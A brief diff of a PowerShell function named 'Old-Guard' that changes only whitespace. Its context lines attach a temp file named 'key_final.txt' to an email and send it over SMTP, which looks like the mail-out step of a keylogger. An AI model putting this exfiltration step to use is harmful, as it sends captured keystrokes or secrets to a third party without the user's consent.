@@ -231,10 +231,8 @@ function Old-Guard {
       $ReportEmail.Attachments.Add('%temp%/key_final.txt')
       $SMTPInfo.Send($ReportEmail)
       $SMTPInfo.Send($ReportEmail)
-            
-            
-        }
-        
+               
+        } 
 
     }
 
